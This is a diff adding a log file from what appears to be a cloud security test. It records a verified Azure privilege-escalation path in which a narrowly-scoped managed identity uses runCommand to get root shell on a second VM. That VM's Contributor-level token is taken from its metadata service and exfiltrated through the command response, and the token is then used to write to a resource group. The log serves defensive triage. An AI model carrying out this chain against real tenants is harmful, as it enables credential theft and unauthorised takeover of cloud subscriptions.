@@ -1,0 +1,47 @@
+[*] target VM (VM-A, foothold):  <VM_A_PUBLIC_IP>
+[*] target VM (VM-B, escalate):  <VM_B_NAME>
+[*] MI-A principalId:            <MI_A_PRINCIPAL_ID>
+[*] MI-A custom role:            '<CUSTOM_ROLE_NAME>'
+[*]                              (VM read + runCommand on VM-B only)
+[*] MI-B principalId:            <MI_B_PRINCIPAL_ID>
+[*] MI-B authority:              Contributor at subscription scope
+[*] target RG:                   pathtriage-rg
+[*] started at:                  2026-07-13T06:52:51.821521+00:00
+
+[*] Step 1: query IMDS for MI-A token (ARM-scoped)
+[+] MI-A ARM token acquired
+    token length:             2056 chars
+    resource:                 https://management.azure.com/
+
+[*] Step 2: POST runCommand to VM-B (executes as root on VM-B)
+    action:                   Microsoft.Compute/virtualMachines/runCommand/action
+    target VM:                <VM_B_NAME>
+
+[+] runCommand accepted (HTTP 202 — async)
+    poll URL:                 https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/...
+
+[*] Step 3: poll runCommand operation (max 180s)
+    ...  0s status: inprogress
+    ... 10s status: succeeded
+[+] runCommand execution succeeded
+
+[*] Step 4: parse runCommand response, extract MI-B token
+[+] MI-B token extracted from runCommand response
+    token length:             2056 chars
+    VM-B hostname (verify):   <VM_B_NAME>
+    token appid:              d04dda6a-b28d-416d-a054-bd5ec64e8d4a
+    token oid:                <MI_B_PRINCIPAL_ID>
+    token aud:                https://management.azure.com/
+
+[*] Step 5: PATCH tag on RG using MI-B token (write proof)
+    baseline: MI-A had only runCommand action on VM-B. Cannot write RG tags.
+    if this write succeeds, it's via MI-B's Contributor scope.
+[+] tag write succeeded
+    tag:                      pathtriage-z8=owned
+    api-version:              2021-04-01  (operation=Merge)
+
+[+] Path Z8 verified: MI-A (VM Diagnostic Runner custom role, narrow) ->
+                      POST runCommand -> arbitrary shell exec as root on VM-B ->
+                      VM-B IMDS -> MI-B token (Contributor at subscription) ->
+                      token exfiltrated via runCommand response ->
+                      RG tag write succeeds via MI-B's Contributor scope
